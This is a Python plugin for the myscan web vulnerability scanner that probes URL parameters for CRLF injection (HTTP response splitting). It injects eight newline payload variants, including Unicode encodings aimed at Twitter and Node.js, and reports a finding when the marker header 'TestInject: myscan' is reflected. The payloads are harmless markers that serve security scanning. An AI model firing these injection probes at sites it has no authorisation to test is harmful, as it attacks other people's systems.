#!/usr/bin/env python3
# @Time    : 2020-02-17
# @Author  : caicai
# @File    : myscan_crlf.py
# refer:https://github.com/w-digital-scanner/w13scan/blob/master/W13SCAN/plugins/PerFile/crlf.py

import copy
import re
from myscan.lib.helper.request import request
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.core.const import notAcceptedExt



class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get(
            "data")  # self.url为需要测试的url，但不会包含url参数，如https://www.baidu.com/index.php#tip1 .不会携带url参数，如?keyword=1
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "crlf inject"
        self.vulmsg="攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）"
        self.level = 1  # 0:Low  1:Medium 2:High

    def verify(self):
        if self.dictdata.get("url").get("extension") in notAcceptedExt:
            return
        # thanks payloads :https://github.com/w-digital-scanner/w13scan/blob/master/W13SCAN/plugins/PerFile/crlf.py
        payloads = [
            "\r\nTestInject: myscan",
            "\r\n\tTestInject: myscan",
            "\r\n TestInject: myscan",
            "\r\tTestInject: myscan",
            "\nTestInject: myscan",
            "\rTestInject: myscan",
            # twitter crlf
            "嘊嘍TestInject: myscan",
            # nodejs crlf
            "čĊTestInject: myscan",
        ]
        parser = dictdata_parser(self.dictdata)
        params_url = parser.getrequestparams_urlorcookie("url")

        if params_url:
            for k, v in params_url.items():
                for payload in payloads:
                    params_url_withpayload = copy.deepcopy(params_url)
                    params_url_withpayload[k] = payload
                    req=parser.generaterequest({"params": params_url_withpayload})
                    r = request(**req)
                    if r!=None:
                        parser_=response_parser(r)
                        resp_headers = str(r.headers)
                        res=re.search("TestInject': 'myscan'",resp_headers)
                        if res:
                            self.result.append({
                                "name": self.name,
                                "url": self.dictdata.get("url").get("url").split("?")[0],
                                "level": self.level,  # 0:Low  1:Medium 2:High
                                "detail": {
                                    "vulmsg": self.vulmsg,
                                    "request":parser_.getrequestraw(),
                                    "response":parser_.getresponseraw(),
                                }
                            })
